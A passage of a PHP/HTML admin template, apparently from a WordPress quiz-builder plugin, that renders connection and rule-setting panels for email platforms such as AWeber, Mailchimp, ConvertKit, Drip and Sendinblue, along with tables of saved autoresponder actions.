												<p>You can set different tags for each outcome in the outcome screen by clicking on Outcome Tags</p>
												<p>SQB will automatically send it to ACTIVECAMPAIGN.</p>
											</div>
										</div>
										<div class="autoresonder_details_fields_outer activecampaign_save_outer_div" style="<?php echo $activecompaign_show_list; ?>">
										   <div class="form-group form-row ">
											  <div class="col-sm-2">
												 <select class="form-control sqb_auto_action" name="sqb_auto_action1">
													<option value="">Select an action</option>
													<option value="add">Add</option>
													<option value="remove">Remove</option>
												 </select>
											  </div>
											  <?php echo $all_outcome; ?>
											  <div class="col-sm-2">
												 <select class="form-control sqb_auto_type" name="sqb_auto_type1">
													<option value="">Select Type</option>
													<option value="list">List</option>
												 </select>
											  </div>
											 
												 <div class="show_selected_type_data col-sm-3" style=" display:none">
													 
													 <?php echo $activecompaign_list_html;?>
													
												 </div>
											  
										   
										   
											  <div class="col-sm-2 d-flex align-items-center hide_tags_option" style=" display:none">
												 <input type="text" name="sqb_tags1" class="sqb_tags form-control" placeholder="Enter tag" value="">
											  </div>
											  <div class="col-sm-3">
													<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary automation_action_btn add_action_btn btn btn btn-primary sqb_ep_click_to_save_btn" type="button" data-action="activecampaign">Click to Save </a>
													<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary " type="button" data-action="activecampaign" style="display:none">Add More </a>
													
												</div>
										   </div>
										   
										   
										   
										      
										    <div class="form-group form-row "> 

											<div class="table-responsive autoresponder_table_details <?php echo strtolower($autoresponder_name);?>" style ="<?php  if(isset($autoresponder_details_obj) && count($autoresponder_details_obj) != 0){}else{ echo 'display:none';} ?>">
												<table  class="table table-bordered autoresponder_table_class autoresponder_table_class">
													<thead>
													 <tr>
															<th>Action</th>
															<th class="autoresponder_outcome_data" <?php echo $hide_email_based_options; ?>>Outcome</th>
															<th>Action Type</th>
															<th>List Name</th>
															
															<th class="text-center">Action</th>
														  </tr>
														  
													</thead>
													<tbody>
													<?php 
													$table_body = '';
													if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)){
														foreach($autoresponder_details_obj as $autoresponder_details){
															
															$table_body_tr_class = '  table_tr_id_'.$autoresponder_details->getId();
															$table_body .= '<tr class="'.$table_body_tr_class.'">';
															$table_body .= '<td>'.ucwords($autoresponder_details->getAction()).'</td>';
															if($autoresponder_details->getOutcomeId()){
																$sqboutcomedata = SQB_Outcome::loadById($autoresponder_details->getOutcomeId());
																if(!empty($sqboutcomedata)){
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'>'.$sqboutcomedata->getOutcomeName().'</td>';
																}else{
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
																}
															}else{
																$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
															}
															$table_body .= '<td>'.ucwords($autoresponder_details->getActionType()).'</td>';
															
															$autoresponder_list_name = '';
															if(isset($activecompaign_lists_sort_by_id[$autoresponder_details->getActionId()])){
																$autoresponder_list_name = $activecompaign_lists_sort_by_id[$autoresponder_details->getActionId()];
															}    
															
															
															$table_body .= '<td class="automation_action_data">'.$autoresponder_list_name.'</td>';
															
															$table_body .= '<td class="text-center delete_autoresponder_td"><i class="fa fa-trash" aria-hidden="true" onclick="sqb_autoresponder_delete_by_id('.$autoresponder_details->getId().')"></i></td>';
															$table_body .= '</tr>';
															
														}
													}
													echo $table_body;
													?>	
														 
													</tbody> 
												</table>
											</div>
										</div>
									</div>
								</li>
							<li>
							<?php 
								 
									 
									//print_r($user_added_plateform_array);
									$autoresponder_name = 'AWEBER';
									$aweberObj = sqb_get_autoresponder_data_edit_mode($autoresponder_name);
									
									$aweber_key = '';
								
									$aweber_connect_text = 'Click Here to Connect';
									$aweber_connect_class = "";
									$aweber_show_list = 'display:none';
									$aweber_show_connect_btn = 'display:none';
									if(in_array('AWEBER',$user_added_plateform_array)){ 
										$aweber_show_connect_btn = '';
									}
									$aweber_list_html = '<select id="sqb_select_list" class="form-control">
											   <option value="">Select List</option>
											</select>';
									
									
									$aweber_key  = '';
									$autoresponder_details_obj  = array();
									//print_r($aweberObj);
									$aweber_lists_sort_by_id = array();
									if(is_array($aweberObj) && count($aweberObj)){
										
										//print_r($aweberObj);
										
										$aweber_key = '';
										if(isset($aweberObj['key'])){
											$aweber_key = $aweberObj['key'];
										}
										$aweber_connect_text = "Connected";
										$aweber_connect_class = "  btn-success ";
										$aweber_show_list = '';
										$aweber_show_connect_btn = '';
										
										$aweber_list_html = '';
										if(isset($aweberObj['auto_html_select'])){
											$aweber_list_html = $aweberObj['auto_html_select'];
										}
										
										$aweber_lists_sort_by_id = '';
										if(isset($aweberObj['lists_sort_by_id'])){
											$aweber_lists_sort_by_id = $aweberObj['lists_sort_by_id'];
										}

										$autoresponder_details_obj = SQB_QuizAutoresponder::loadByQuizIdAndAutoresponderName($auto_quiz_id,$autoresponder_name);
										
									}
									if(!in_array('AWEBER',$user_added_plateform_array)){ 
										$aweber_show_list = 'display:none';
									}
									?>	
								
								
								
								<div class="add_user_in_your_email_platform_inner">
								<span class="checkbox-custom-style">
									<input type="checkbox" name="add_user_in_your_email_platform" value="AWEBER" class="custom-checkbox-input" <?php if(in_array('AWEBER',$user_added_plateform_array)){ echo "checked='checked'"; }  ?>>
									<span class="custom--checkbox"></span>
								</span>
								<span>AWEBER</span>
								</div>
								<button type="button" class="btn btn-primary checkeck_email_has  <?php echo $aweber_connect_class; ?>" data-toggle="modal" data-target="#user_add_my_email_plateform_aweber_modal" style="<?php echo $aweber_show_connect_btn; ?>"><?php echo  $aweber_connect_text; ?></button>
								<div class="form-group form-row sqb-ep-notice aweber-message mt-4" style="<?php if(in_array('AWEBER',$user_added_plateform_array)){ echo "display:block"; }else{ echo 'display:none'; }  ?>">
									<div class="alert alert-v2 alert-warning" role="alert" bis_skin_checked="1">
										<p>You can set different tags for each outcome in the outcome screen by clicking on Outcome Tags</p>
										<p>SQB will automatically send it to AWeber.</p>
									</div>
								</div>

								<div class="autoresonder_details_fields_outer aweber_save_outer_div" style="<?php echo $aweber_show_list; ?>">
								   <div class="form-group form-row ">
									  <div class="col-sm-2">
										 <select class="form-control sqb_auto_action" name="sqb_auto_action1">
											<option value="">Select an action</option>
											<option value="add">Add</option>
											<option value="remove">Remove</option>
										 </select>
									  </div>
									  <?php echo $all_outcome; ?>
									  <div class="col-sm-2">
										 <select class="form-control sqb_auto_type" name="sqb_auto_type1">
											<option value="">Select Type</option>
											<option value="list">List</option>
										 </select>
									  </div>
									 
										 <div class="show_selected_type_data col-sm-3" style=" display:none">
											<?php echo $aweber_list_html; ?>
										 </div>
									 
								
									  <div class="col-sm-3 d-flex align-items-center hide_tags_option " style="display:none">
										 <input type="text" name="sqb_tags1" class="sqb_tags form-control" placeholder="Enter tag" value="">
									  </div>
									  <div class="col-sm-3">
											<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary sqb_ep_click_to_save_btn" type="button" data-action="aweber">Click to Save</a>
											<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary automation_action_btn add_action_btn btn btn btn-primary" type="button" data-action="aweber" style="display:none">Add More </a>
										</div>
								   </div>
								  
								   
								 <div class="form-group form-row "> 
										 <?php 												
										  
										  ?>
											<div class="table-responsive autoresponder_table_details <?php echo strtolower($autoresponder_name);?>" style ="<?php  if(isset($autoresponder_details_obj) && count($autoresponder_details_obj) != 0){}else{ echo 'display:none';}?>">
												<table  class="table table-bordered autoresponder_table_class autoresponder_table_class">
													<thead>
													 <tr>
															<th>Action</th>
															<th class="autoresponder_outcome_data" <?php echo $hide_email_based_options; ?>>Outcome</th>
															<th>Action Type</th>
															<th>List Name</th>
															
															<th class="text-center">Action</th>
														  </tr>
														  
													</thead>
													<tbody>
													<?php 
													$table_body = '';
													if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)){
														foreach($autoresponder_details_obj as $autoresponder_details){
															
															$table_body_tr_class = '  table_tr_id_'.$autoresponder_details->getId();
															$table_body .= '<tr class="'.$table_body_tr_class.'">';
															$table_body .= '<td>'.ucwords($autoresponder_details->getAction()).'</td>';
															if($autoresponder_details->getOutcomeId()){
																$sqboutcomedata = SQB_Outcome::loadById($autoresponder_details->getOutcomeId());
																if(!empty($sqboutcomedata)){
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'>'.$sqboutcomedata->getOutcomeName().'</td>';
																}else{
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
																}
															}else{
																$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
															}
															$table_body .= '<td>'.ucwords($autoresponder_details->getActionType()).'</td>';
															
															$aweber_list_name = '';
															if(isset($aweber_lists_sort_by_id[$autoresponder_details->getActionId()])){
																$aweber_list_name = $aweber_lists_sort_by_id[$autoresponder_details->getActionId()];
															}    

															


															$table_body .= '<td class="automation_action_data">'.$aweber_list_name.'</td>';
															
															$table_body .= '<td class="text-center delete_autoresponder_td"><i class="fa fa-trash" aria-hidden="true" onclick="sqb_autoresponder_delete_by_id('.$autoresponder_details->getId().')"></i></td>';
															$table_body .= '</tr>';
															
														}
													}
													echo $table_body;
													?>	
														 
													</tbody> 
													</table>
											</div>
										</div>
										
								
								</div>

								
								
								
								
							</li>
							<li>
								
							<?php 
								 
									 
									//print_r($user_added_plateform_array);
									$autoresponder_name = 'MAILCHIMP';
									$mailchimpObj = sqb_get_autoresponder_data_edit_mode($autoresponder_name);
									
									$mailchimp_key = '';
								
									$mailchimp_connect_text = 'Click Here to Connect';
									$mailchimp_connect_class = "";
									$mailchimp_show_list = 'display:none';
									$mailchimp_show_connect_btn = 'display:none';
									if(in_array('MAILCHIMP',$user_added_plateform_array)){ 
										$mailchimp_show_connect_btn = '';
									}
									$mailchimp_list_html = '<select id="sqb_select_list" class="form-control">
											   <option value="">Select List</option>
											</select>';
									
									
									$mailchimp_api_key  = '';
									$autoresponder_details_obj  = array();
									$mailchimp_lists_sort_by_id = array();
									
									if(is_array($mailchimpObj)  && count($mailchimpObj)){
										
										//print_r($aweberObj);
										
										$mailchimp_api_key = '';
										if(isset( $mailchimpObj['key'])){
											$mailchimp_api_key = $mailchimpObj['key'];
										}
										$mailchimp_connect_text = "Connected";
										$mailchimp_connect_class = "  btn-success ";
										$mailchimp_show_list = '';
										$mailchimp_list_html = '';
										$mailchimp_show_connect_btn = '';
										if(isset($mailchimpObj['auto_html_select'])){
											$mailchimp_list_html = $mailchimpObj['auto_html_select'];
										}
										
										$mailchimp_lists_sort_by_id = '';
										if(isset($mailchimpObj['lists_sort_by_id'])){
											$mailchimp_lists_sort_by_id = $mailchimpObj['lists_sort_by_id'];
										}
										$autoresponder_details_obj = SQB_QuizAutoresponder::loadByQuizIdAndAutoresponderName($auto_quiz_id,$autoresponder_name);   
										
									}
									if(!in_array('MAILCHIMP',$user_added_plateform_array)){ 
										$mailchimp_show_list = 'display:none';
									}
									?>		
								
								<div class="add_user_in_your_email_platform_inner">
								<span class="checkbox-custom-style">
									<input type="checkbox" name="add_user_in_your_email_platform" value="MAILCHIMP" class="custom-checkbox-input" <?php if(in_array('MAILCHIMP',$user_added_plateform_array)){ echo "checked='checked'"; }  ?>>
									<span class="custom--checkbox"></span>
								</span>
								<span>MAILCHIMP</span>
								</div>
								<button type="button" class="btn btn-primary checkeck_email_has  <?php echo $mailchimp_connect_class;?>" data-toggle="modal" data-target="#user_add_my_email_plateform_mailchimp_modal" style="<?php echo $mailchimp_show_connect_btn; ?>"><?php echo $mailchimp_connect_text;?> </button>

								<div class="form-group form-row sqb-ep-notice mt-4" style="<?php if(in_array('MAILCHIMP',$user_added_plateform_array)){ echo "display:block"; }else{ echo "display:none"; }  ?>">
									<div class="alert alert-v2 alert-warning" role="alert" bis_skin_checked="1">
										<p>You can set different tags for each outcome in the outcome screen by clicking on Outcome Tags</p>
										<p>SQB will automatically send it to MailChimp.</p>
									</div>
								</div>

								<div class="autoresonder_details_fields_outer  mailchimp_save_outer_div" style="<?php echo $mailchimp_show_list; ?>">
								   <div class="form-group form-row ">
									  <div class="col-sm-2">
										 <select class="form-control sqb_auto_action" name="sqb_auto_action1">
											<option value="">Select an action</option>
											<option value="add">Add</option>
											<option value="remove">Remove</option>
										 </select>
									  </div>
									  <?php echo $all_outcome; ?>
									  <div class="col-sm-2">
										 <select class="form-control sqb_auto_type" name="sqb_auto_type1">
											<option value="">Select Type</option>
											<option value="list">Audience</option>
										 </select>
									  </div> 
									  
									<div class="show_selected_type_data col-sm-3" style=" display:none">
											<?php echo $mailchimp_list_html;?>
									</div>
										 
									<div class="col-sm-2 d-flex align-items-center hide_tags_option" style="display:none">  
										 <input type="text" name="sqb_tags1" class="sqb_tags form-control" placeholder="Enter tag" value="">
									  </div>
									<div class="col-sm-3">
											<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary automation_action_btn add_action_btn btn btn btn-primary sqb_ep_click_to_save_btn" type="button" data-action="mailchimp">Click to Save</a>
											<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary " type="button" data-action="mailchimp" style="display:none">Add More </a>
											
									</div>	 
									  
								   </div>
								   <div class="form-group form-row " >
									   
									   <div class="col-sm-12 d-flex align-items-center">
									   
									   
									   </div>
									   </div>
									   
								  
								    
									
									 <div class="form-group form-row "> 
										 
											<div class="table-responsive autoresponder_table_details <?php echo strtolower($autoresponder_name);?>" style ="<?php  if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)  != 0){}else{ echo 'display:none';} ?>">
												<table  class="table table-bordered autoresponder_table_class autoresponder_table_class">
													<thead>
													 <tr>
															<th>Action</th>
															<th class="autoresponder_outcome_data" <?php echo $hide_email_based_options; ?>>Outcome</th>
															<th>Action Type</th>
															<th>List Name</th>
															
															<th class="text-center">Action</th>
														  </tr>
														  
													</thead>
													<tbody>
													<?php 
													$table_body = '';
													if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)){
														foreach($autoresponder_details_obj as $autoresponder_details){
															
															$table_body_tr_class = '  table_tr_id_'.$autoresponder_details->getId();
															$table_body .= '<tr class="'.$table_body_tr_class.'">';
															$table_body .= '<td>'.ucwords($autoresponder_details->getAction()).'</td>';
															if($autoresponder_details->getOutcomeId()){
																$sqboutcomedata = SQB_Outcome::loadById($autoresponder_details->getOutcomeId());
																if(!empty($sqboutcomedata)){
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'>'.$sqboutcomedata->getOutcomeName().'</td>';
																}else{
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
																}
																
															}else{
																$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
															}
															$table_body .= '<td>'.ucwords($autoresponder_details->getActionType()).'</td>';
															$mailchimp_list_name = '';
															if(isset($mailchimp_lists_sort_by_id[$autoresponder_details->getActionId()])){
																$mailchimp_list_name = $mailchimp_lists_sort_by_id[$autoresponder_details->getActionId()];
															}    

															


															$table_body .= '<td class="automation_action_data">'.$mailchimp_list_name.'</td>';
															
															$table_body .= '<td class="text-center delete_autoresponder_td"><i class="fa fa-trash" aria-hidden="true" onclick="sqb_autoresponder_delete_by_id('.$autoresponder_details->getId().')"></i></td>';
															$table_body .= '</tr>';
															
														}
													}
													echo $table_body;
													?>	
														 
													</tbody> 
													</table>
											</div>
										</div>

										
									
								</div>
								
								
							</li>
							
							
							<li>
								<?php 
								 
									 
									//print_r($user_added_plateform_array);
									$autoresponder_name = 'CONVERTKIT';
									$convertkitObj = sqb_get_autoresponder_data_edit_mode($autoresponder_name);
									
									$convertkit_key = '';
								
									$convertkit_connect_text = 'Click Here to Connect';
									$convertkit_connect_class = "";
									$convertkit_show_list = 'display:none';
									$convertkit_show_connect_btn = 'display:none';
									if(in_array('CONVERTKIT',$user_added_plateform_array)){ 
										$convertkit_show_connect_btn = '';
									}
									$convertkit_sequence_html = '<select id="sqb_select_sequence" class="form-control" style=""><option value="">Select Sequence</option></select>';
											
								    $convertkit_form_html = '<select id="sqb_select_form" class="form-control" style=""><option value="">Select Form</option></select>';
									
									
									$convertkit_key = '';
									$convertkit_secret = '';
									$autoresponder_details_obj = array();
									$lists_sort_by_id_form = array();
									if(is_array($convertkitObj) && count($convertkitObj)){
										
										//print_r($convertkitObj);
										
										$convertkit_key = '';
										if(isset($convertkitObj['key'])){
											$convertkit_key = $convertkitObj['key'];
										}
										
										$convertkit_secret = '';
										if(isset($convertkitObj['secret'])){
											$convertkit_secret = $convertkitObj['secret'];
										}
										
										
										$convertkit_connect_text = "Connected";
										$convertkit_connect_class = "  btn-success ";
										$convertkit_show_list = '';
										$convertkit_show_connect_btn = '';
										
										$convertkit_form_html = '';
										if(isset($convertkitObj['auto_html_forms_select'])){
											$convertkit_form_html = $convertkitObj['auto_html_forms_select'];
										}
										
										$convertkit_sequence_html = '';
										if(isset($convertkitObj['auto_html_sequence_select'])){
											$convertkit_sequence_html = $convertkitObj['auto_html_sequence_select'];
										}
										
										
										$lists_sort_by_id_sequences = '';
										if(isset($convertkitObj['lists_sort_by_id_sequences'])){
											$lists_sort_by_id_sequences = $convertkitObj['lists_sort_by_id_sequences'];
										}
										
										$lists_sort_by_id_form = '';
										if(isset($convertkitObj['lists_sort_by_id_form'])){
											$lists_sort_by_id_form = $convertkitObj['lists_sort_by_id_form'];
										}

										$autoresponder_details_obj = SQB_QuizAutoresponder::loadByQuizIdAndAutoresponderName($auto_quiz_id,$autoresponder_name);
										
									}
									if(!in_array('CONVERTKIT',$user_added_plateform_array)){ 
										$convertkit_show_list = 'display:none';
									}
									?>		
								
								
								
								<div class="add_user_in_your_email_platform_inner">
								<span class="checkbox-custom-style">
									<input type="checkbox" name="add_user_in_your_email_platform" value="CONVERTKIT" class="custom-checkbox-input" <?php if(in_array('CONVERTKIT',$user_added_plateform_array)){ echo "checked='checked'"; }  ?>>
									<span class="custom--checkbox"></span>
								</span>
								<span>CONVERTKIT</span>
								</div>
								<button type="button" class="btn btn-primary checkeck_email_has <?php echo $convertkit_connect_class;?>" data-toggle="modal" data-target="#user_add_my_email_plateform_convertkit_modal" style="<?php echo $convertkit_show_connect_btn;?>"><?php echo $convertkit_connect_text;?></button>

								<div class="form-group form-row sqb-ep-notice mt-4" style="<?php if(in_array('CONVERTKIT',$user_added_plateform_array)){ echo "display:block"; }else{ echo "display:none"; }  ?>">
									<div class="alert alert-v2 alert-warning" role="alert" bis_skin_checked="1">
										<p>You can set different tags for each outcome in the outcome screen by clicking on Outcome Tags</p>
										<p>SQB will automatically send it to ConvertKit.</p>
									</div>
								</div>

								<div class="autoresonder_details_fields_outer convertkit_save_outer_div" style="<?php echo $convertkit_show_list;?>">
								   <div class="form-group form-row ">
									  <div class="col-sm-3">
										 <select class="form-control sqb_auto_action" name="sqb_auto_action1">
											<option value="">Select an action</option>
											<option value="add">Add</option>
											<option value="remove">Remove</option>
										 </select>
									  </div>
									  <?php echo $all_outcome; ?>
									  <div class="col-sm-2">
										 <select class="form-control sqb_auto_type" name="sqb_auto_type1">
											<option value="">Select Type</option>
											<option value="form">Form</option>
											<option value="sequence">Sequence</option>
										 </select>
									  </div>
									  <div class="col-sm-3 sqb_select_sequence_outer" style="display:none">
											<?php echo $convertkit_sequence_html;?>
									  </div>
										<div class="col-sm-3 select_form sqb_select_form_outer" style="display:none">
											<?php echo $convertkit_form_html;?>
										</div>
										<div class="col-sm-2 d-flex align-items-center hide_tags_option hide_tags_option" style="display:none">
											<input type="text" name="sqb_tags1" class="sqb_tags form-control" placeholder="Enter tag" value="">
										</div>
										<div class="col-sm-3">
											<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary automation_action_btn add_action_btn btn btn btn-primary sqb_ep_click_to_save_btn" type="button" data-action="convertkit">Click to Save</a>
											<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary " type="button" data-action="convertkit" style="display:none">Add More </a>
										</div>
										
									</div>
								  
								    
								   
								    <div class="form-group form-row "> 
										 
											<div class="table-responsive autoresponder_table_details <?php echo strtolower($autoresponder_name);?>" style ="<?php  if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)  != 0){}else{ echo 'display:none';} ?>">
												<table  class="table table-bordered autoresponder_table_class autoresponder_table_class">
													<thead>
													 <tr>
															<th>Action</th>
															<th class="autoresponder_outcome_data" <?php echo $hide_email_based_options; ?>>Outcome</th>
															<th>Action Type</th>
															<th>List Name</th>
															
															<th class="text-center">Action</th>
														  </tr>
														  
													</thead>
													<tbody>
													<?php 
													$table_body = '';
													if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)){
														foreach($autoresponder_details_obj as $autoresponder_details){
															
															$table_body_tr_class = '  table_tr_id_'.$autoresponder_details->getId();
															$table_body .= '<tr class="'.$table_body_tr_class.'">';
															$table_body .= '<td>'.ucwords($autoresponder_details->getAction()).'</td>';
															if($autoresponder_details->getOutcomeId()){
																$sqboutcomedata = SQB_Outcome::loadById($autoresponder_details->getOutcomeId());
																if(!empty($sqboutcomedata)){
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'>'.$sqboutcomedata->getOutcomeName().'</td>';
																}else{
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
																}
															}else{
																$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
															}
															$table_body .= '<td>'.ucwords($autoresponder_details->getActionType()).'</td>';
															
															$convertkit_list_name = '';
															if($autoresponder_details->getActionType() == 'form'){
																
																if(isset($lists_sort_by_id_form[$autoresponder_details->getActionId()])){
																	$convertkit_list_name = $lists_sort_by_id_form[$autoresponder_details->getActionId()];
																}  
																
															}else if($autoresponder_details->getActionType() == 'sequence'){
																if(isset($lists_sort_by_id_sequences[$autoresponder_details->getActionId()])){
																	$convertkit_list_name = $lists_sort_by_id_sequences[$autoresponder_details->getActionId()];
																}  
															}
										

															$table_body .= '<td class="automation_action_data">'.$convertkit_list_name.'</td>';
															
															
															$table_body .= '<td class="text-center delete_autoresponder_td"><i class="fa fa-trash" aria-hidden="true" onclick="sqb_autoresponder_delete_by_id('.$autoresponder_details->getId().')"></i></td>';
															$table_body .= '</tr>';
															
														}
													}
													echo $table_body;
													?>	
														 
													</tbody> 
													</table>
											</div>
										</div>

										
									
								</div>
								
								
								
								
								
							</li>
							<li>
								
								
								<?php 
								 
									 
									//print_r($user_added_plateform_array);
									$autoresponder_name = 'DRIP';
									$dripObj = sqb_get_autoresponder_data_edit_mode($autoresponder_name);
									
									$drip_key = '';
								
									$drip_connect_text = 'Click Here to Connect';
									$drip_connect_class = "";
									$drip_show_list = 'display:none';
									$drip_show_connect_btn = 'display:none';
									if(in_array('DRIP',$user_added_plateform_array)){ 
										$drip_show_connect_btn = '';
									}
									$drip_sequence_html = '<select id="sqb_select_sequence" class="form-control" style=""><option value="">Select Sequence</option></select>';
											
								    $auto_html_select = '<select class="automation_select1 add_to_value_drip" id="sqb_select_list" style="display:none;">
										<option value="">Select Campaign</option>
										
										</select>';
									
									
									$drip_key  = '';
									$drip_lists_sort_by_id = array();
									 
									if(is_array($dripObj) && count($dripObj)){
										
										//print_r($dripObj);
										
										$drip_url = '';
										if(isset($dripObj['client_id'])){
											$drip_url = $dripObj['client_id'];
										}
										
										$drip_key = '';
										if(isset($dripObj['api_token'])){
											$drip_key = $dripObj['api_token'];
										}
										$drip_connect_text = "Connected";
										$drip_connect_class = "  btn-success ";
										$drip_show_list = '';
										$drip_show_connect_btn = '';
									
										$auto_html_select = '';
										if(isset($dripObj['auto_html_select'])){
												$auto_html_select = $dripObj['auto_html_select'];
										}
										
										$drip_lists_sort_by_id = '';
										if(isset($dripObj['lists_sort_by_id'])){
												$drip_lists_sort_by_id = $dripObj['lists_sort_by_id'];
										}
										//$drip_sequence_html = $dripObj['auto_html_sequence_select'];
										
									}
									if(!in_array('DRIP',$user_added_plateform_array)){ 
										$drip_show_list = 'display:none';
									}
									?>		
								
								<div class="add_user_in_your_email_platform_inner">
								<span class="checkbox-custom-style">
									<input type="checkbox" name="add_user_in_your_email_platform" value="DRIP" class="custom-checkbox-input" <?php if(in_array('DRIP',$user_added_plateform_array)){ echo "checked='checked'"; }  ?>>
									<span class="custom--checkbox"></span>
								</span>
								<span>DRIP</span>
								</div>
								<button type="button" class="btn btn-primary checkeck_email_has <?php echo $drip_connect_class;?>" data-toggle="modal" data-target="#user_add_my_email_plateform_drip_modal" style="<?php echo $drip_show_connect_btn; ?>"><?php echo $drip_connect_text; ?> </button>

								<div class="form-group form-row sqb-ep-notice mt-4" style="<?php if(in_array('DRIP',$user_added_plateform_array)){ echo "display:block"; }else{ echo "display:none"; }  ?>">
									<div class="alert alert-v2 alert-warning" role="alert" bis_skin_checked="1">
										<p>You can set different tags for each outcome in the outcome screen by clicking on Outcome Tags</p>
										<p>SQB will automatically send it to Drip.</p>
									</div>
								</div>

							</li>
							
							<li>
								
								
								<?php 
								 
									 
									//print_r($user_added_plateform_array);
									$autoresponder_name = 'SENDINBLUE';
									$sendinblueObj = sqb_get_autoresponder_data_edit_mode($autoresponder_name);
									
									$sendinblue_api_key = '';
									$autoresponder_details_obj = array();
								
									$sendinblue_connect_text = 'Click Here to Connect';
									$sendinblue_connect_class = "";
									$sendinblue_show_list = 'display:none';
									$sendinblue_show_connect_btn = 'display:none';
									if(in_array('SENDINBLUE',$user_added_plateform_array)){ 
										$sendinblue_show_connect_btn = '';
									}
									
										
									$sendinblue_select_list = '<select class="automation_select1 add_to_value_sendinblue" id="add_to_value1" style="display:none;">';
										$sendinblue_select_list .= '<option value="">Select List</option>';
			
									$sendinblue_select_list .= '</select>';
									
									
									
									$sendinblue_lists_sort_by_id = array();
									 
									if(is_array($sendinblueObj)  && count($sendinblueObj)){
										
										
										
										
										$sendinblue_connect_text = "Connected";
										$sendinblue_connect_class = "  btn-success ";
										$sendinblue_show_list = '';
										$sendinblue_show_connect_btn = '';
									
										
										if(isset($sendinblueObj['api_key'])){
											$sendinblue_api_key = $sendinblueObj['api_key'];
										}
										if(isset($sendinblueObj['lists'])){
												$sendinblue_select_list = $sendinblueObj['lists'];
										}
										if(isset($sendinblueObj['lists_sort_by_id'])){
												$sendinblue_lists_sort_by_id = $sendinblueObj['lists_sort_by_id'];
										}
										
										
										$autoresponder_details_obj = SQB_QuizAutoresponder::loadByQuizIdAndAutoresponderName($auto_quiz_id,$autoresponder_name);
										
									}
									if(!in_array('SENDINBLUE',$user_added_plateform_array)){ 
										$sendinblue_show_list = 'display:none';
									}
										
									?>		
								
								<div class="add_user_in_your_email_platform_inner">
								<span class="checkbox-custom-style">
									<input type="checkbox" name="add_user_in_your_email_platform" value="SENDINBLUE" class="custom-checkbox-input" <?php if(in_array('SENDINBLUE',$user_added_plateform_array)){ echo "checked='checked'"; }  ?>>
									<span class="custom--checkbox"></span>
								</span>
								<span>SENDINBLUE</span>
								</div>
								<button type="button" class="btn btn-primary checkeck_email_has <?php echo $sendinblue_connect_class;?>" data-toggle="modal" data-target="#user_add_my_email_plateform_sendinblue_modal" style="<?php echo $sendinblue_show_connect_btn; ?>"><?php echo $sendinblue_connect_text; ?> </button>
								<div class="form-group form-row sqb-ep-notice mt-4" style="<?php if(in_array('SENDINBLUE',$user_added_plateform_array)){ echo "display:block"; }else{ echo "display:none"; }  ?>">
									<div class="alert alert-v2 alert-warning" role="alert" bis_skin_checked="1">
										<p>You can set different tags for each outcome in the outcome screen by clicking on Outcome Tags</p>
										<p>SQB will automatically send it to SendinBLue.</p>
									</div>
								</div>

								<div class="autoresonder_details_fields_outer sendinblue_save_outer_div" style="<?php echo $sendinblue_show_list; ?>">
								   <div class="form-group form-row ">
									  <div class="col-sm-2">
										 <select class="automation_select1 add_to_id_sendinblue" id="add_to_id1">
											<option value="">Select Action</option>
											<option value="A:ListId">Add to List</option> 
											<option value="R:ListId">Remove From List</option> 
											
										</select>
									  </div>
									  <?php echo $all_outcome; ?>
									 
									<div class='sqb_select_list_outer col-sm-2'><?php echo $sendinblue_select_list; ?></div>
									 
									  
									 	  
									  <div class="col-sm-3">
											<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary automation_action_btn add_action_btn btn btn btn-primary sqb_ep_click_to_save_btn" type="button" data-action="sendinblue">Click to Save</a>
											<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary " type="button" data-action="sendinblue" style="display:none">Add More </a>
											
										</div>  
									  
									  
									  
								   </div>
								   <div class="form-group form-row " style="display:none">
									  <div class="col-sm-12 d-flex align-items-center">
										<span class="automation_radio show_tags" id="show_tags1" style="display:none;">
											<label>Do you want to use tags:</label><input type="radio" data-name="yes" checked="" value="yes" name="automation_tags"data-id="1"> Yes  <input type="radio" data-name="no" value="no" name="automation_tags" data-id="1"> No &nbsp;&nbsp;<span style="font-size: 13px;font-weight: 600;">(comma-separated list of tags) </span>
											
										 </span>
									  </div>
								   </div>
								
									
									 <div class="form-group form-row "> 
										 
											<div class="table-responsive autoresponder_table_details <?php echo strtolower($autoresponder_name);?>" style ="<?php  if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)  != 0){}else{ echo 'display:none';} ?>">
												<table  class="table table-bordered autoresponder_table_class autoresponder_table_class">
													<thead>
													 <tr>
															<th>Action</th>
															<th class="autoresponder_outcome_data" <?php echo $hide_email_based_options; ?>>Outcome</th>
															<th>List Name</th>
															
															<th class="text-center">Action</th>
														  </tr>
														  
													</thead>
													<tbody>
													<?php 
													$table_body = '';
													if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)){
														foreach($autoresponder_details_obj as $autoresponder_details){
															
															$table_body_tr_class = '  table_tr_id_'.$autoresponder_details->getId();
